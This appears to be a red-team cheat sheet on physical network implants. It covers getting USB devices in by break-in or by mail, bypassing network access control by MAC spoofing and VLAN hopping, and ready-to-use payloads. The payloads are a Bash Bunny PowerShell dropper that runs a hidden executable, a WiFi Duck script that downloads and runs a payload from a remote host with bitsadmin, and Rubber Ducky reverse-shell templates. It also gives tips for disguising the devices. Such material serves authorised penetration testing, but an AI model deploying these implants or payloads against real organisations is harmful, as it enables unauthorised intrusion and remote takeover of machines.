# __Network access via physical implants__
>Author: Pieter Miske
---
### __Physical Red Teaming and implant usage considerations:__
#### _Methods to deliver an implant:_
- Break in: gain access to a physical location of the target and try to plug\-in the implant\.  
- Mail: use post delivery services to send and deliver malicious hardware \(e\.g\. USB stick\) to the target with a convincing pre\-text to get initial foothold \(e\.g\. information on the USB stick is to confidential to deliver via email or make them feel privileged in some way\)\. The payload can be the usb itself \(e\.g\. rubber ducky\) or malicious file on the drive\.  

#### _NAC bypass for dropbox:_
Network Access Control \(NAC\) acts as a kind of a gatekeeper to the local network infrastructure\. Its usually works with whitelists, blacklists, authentication requirements \(creds/certificates\) or host scanning to restrict access and keep unwanted devices out of the network\. NAC can be applied to both wired and wireless networks\. More info can be found here: [The Hacker Recipes](https://www.thehacker.recipes/physical/networking/network-access-control#theory)\.
- MAC spoofing: You take a VoIP phone or a printer, use their MAC address on your attacking machine and you should be provided with an IP address from the DHCP server\. Why? Because these devices are whitelisted as they do not support 802\.1x authentication\. 
- VLAN hopping: This can be achieved by plugging the laptop into the network port of VoIP phone and using a utility such as voiphopper \(pre installed in Kali Linux\)
- Get credentials that give access to the wireless network \(social engineering, dumping from system that is connected, evil twin attack, etc\.\)


---
### __Physcial implant options:__
#### _Bash Bunny:_
This technique starts a reverse shell back to your C2 server based on an obfuscated payload stored on the bash bunny\. The process takes \+/\- 25 seconds to complete\. Bash bunny switches: Arming Mode \(switch closed to the usb connector\); Payload 1 \(switch closed to the back of the usb stick\); Payload 2 \(switch in the middle\)\.
>It is recommended to change the USB name of the BashBunny to something less suspicious like ‘IRONKEY’ \(don’t forget to rename the names in the scripts aswell\)\. 
- 1\. Create an obfuscated \.exe payload for your C2 server
- 2\. \(optional\) If you want to copy the obfuscated payload to disk and execute it from there instead of directly from the bashbunny, create the following script \(run\.ps1\) and reverence it in the bellow “payload\.txt” file:
    ```PowerShell
    $Drive = (Get-WMIObject Win32_Volume | ? { $_.Label -eq 'IRONKEY' }).name
    $user = $env:UserName
    $Dropper = $Drive + "payloads\switch1\payload.exe"
    $DestinationFile1 = "C:\users\public\documents\payload.exe"
    
    If ((Test-Path $DestinationFile1) -eq $false){
        New-Item -ItemType File -Path $DestinationFile1 -Force
    }
    Copy-Item -Path $Dropper -Destination $DestinationFile1
    Start-Process cmd -ArgumentList "/c C:\users\public\documents\payload.exe"
    ```
    - 3\. Create the bashbunny payload\.txt file and specify if you want to run the payload\.exe or run\.ps1 script: 
    ```
    #Sets attack mode and stores current switch position
    LED SETUP
    ATTACKMODE HID STORAGE
    GET SWITCH_POSITION#Runs Powershell script
    LED ATTACK
    RUN WIN powershell -nop -ep bypass -w Hidden ".((gwmi win32_volume -f 'label=''IRONKEY''').Name+'payloads\\$SWITCH_POSITION\<payload.exe OR run.ps1>')"
    LED FINISH
    ```
- 4\. Switch the bash bunny to Arming Mode and upload ‘payload\.txt’, ‘payload\.exe’ and if required ‘run\.ps1’ to: BashBunny > payloads > switch1
- 5\. Change the bash bunny switch to Payload 1, plug it into the unlocked target system and wait until te led light is green\.

#### _Wifi Duck:_
By emulating a USB keyboard like the rubber ducky, this device can be used to remote control a computer via WiFi, automate tasks or execute software to gain full access\.
>It is recommended to rename the Wifi hotspot name of the WifiDuck in the ‘Settings’ tab \(e\.g\. iPhone of John\)\.
- 1\. Plug the Wifi Duck into a target computer, connect to the Wifi Duck wifi hotspot with the password "wifiduck" and browse to "192\.168\.4\.1" to open the interface
- 2\. Here you can add, save and run ducky scripts \(in rubber ducky format\) remotely on the target system \(encoding of the script to \.bin is done automatically\):
    ```
    LED 0 0 255
    DELAY 1000
    GUI r
    DELAY 1000
    
    STRING cmd
    ENTER
    DELAY 1000
    
    STRING bitsadmin /transfer payload.exe http://10.10.10.10/payload.exe %APPDATA%\payload.exe & %APPDATA%\payload.exe & timeout 20 & exit
    ENTER
    DELAY 1000
    LED 0 153 0
    DELAY 2000
    LED 0 0 0
    ```
- 3\. \(optional\) it is possible to autorun a stored script on the duck during the first connection \(disable it in the "Settings" tab\)\.

#### _Rubber Ducky:_
>More rubber ducky payloads can be found [here](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads): 
- 1\. Modify one of the following payload templates and compile using this [online encoder](https://ducktoolkit.com/encode): 
    - Windows reverse shell:
        ```
        DELAY 1000
        GUI r
        DELAY 1000
        STRING cmd
        ENTER
        DELAY 1000
        STRING <command string to execute>
        ENTER
        DELAY 5000
        ```
    - Linux reverse shell:
        ```
        DELAY 500
        ALT F2
        DELAY 300
        STRING lxterminal
        DELAY 300
        ENTER
        DELAY 600
        STRING <insert executable payload here>
        DELAY 2000
        ENTER
        ```
- 2: Save the created inject\.bin to USB rubber ducky
- 3: Inject USB rubber ducky into USB port of the target machine

#### _Raspberry Pi dropbox with NAC bypass:_
__Under construction__
